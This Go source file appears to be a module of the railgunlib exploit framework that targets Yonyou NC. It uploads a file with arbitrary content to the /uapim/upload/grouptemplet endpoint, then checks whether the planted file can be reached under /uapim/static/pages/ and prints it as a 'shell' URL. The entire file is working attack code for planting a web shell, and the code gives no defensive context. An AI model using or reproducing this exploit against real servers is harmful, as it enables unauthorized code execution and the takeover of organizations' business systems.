package yonyouNC

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"path/filepath"
	"strings"
)

type Exp_202207_grouptempletUpload struct {
	exp_templates.ExpTemplate
}

func (self *Exp_202207_grouptempletUpload) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	fileType := strings.TrimLeft(filepath.Ext(filename), ".")
	groupId := self.MustGetStringParam("groupId")
	target := goutils.AppendUri(self.Params.BaseParam.Target, fmt.Sprintf("/uapim/upload/grouptemplet?fileType=%s&groupid=%s", fileType, groupId))

	data := []lzhttp.PostMultiPart{
		{
			"filename",
			filename,
			"",
			[]byte(content),
		},
	}
	// 发送请求
	httpresp := self.HttpPostMultiWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("状态码：" + httpresp.Resp.Status)
		return
	}
	shellUrl := goutils.AppendUri(self.Params.BaseParam.Target, fmt.Sprintf("/uapim/static/pages/%s/head.%s", groupId, fileType))
	httpresp = self.HttpGetWithoutRedirect(shellUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 404 {
		self.EchoSuccessMsg("状态码：" + httpresp.Resp.Status)
		self.EchoSuccessMsg("shell: " + shellUrl)
		expResult.Status = true
	}

	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_202207_grouptempletUpload{}, "exp_202207_grouptempletUpload.yml")

}
